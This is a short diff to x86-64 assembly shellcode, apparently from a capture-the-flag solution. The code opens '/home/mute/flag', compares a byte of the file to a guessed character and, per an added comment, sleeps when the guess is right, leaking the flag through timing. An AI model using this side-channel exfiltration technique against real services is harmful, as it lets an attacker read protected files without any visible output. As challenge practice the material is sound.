@@ -2,6 +2,7 @@ section .text
     global _start
 
 _start:
+;/home/mute/flag
 mov r8, 0x67616c662f6574
 push r8
 mov r8, 0x756d2f656d6f682f
@@ -26,6 +27,7 @@ syscall
 cmp byte [rsi + 1], 0x69
 jne exit
 
+;guessed correct? sleep
 mov ecx,0
 loop1:
 
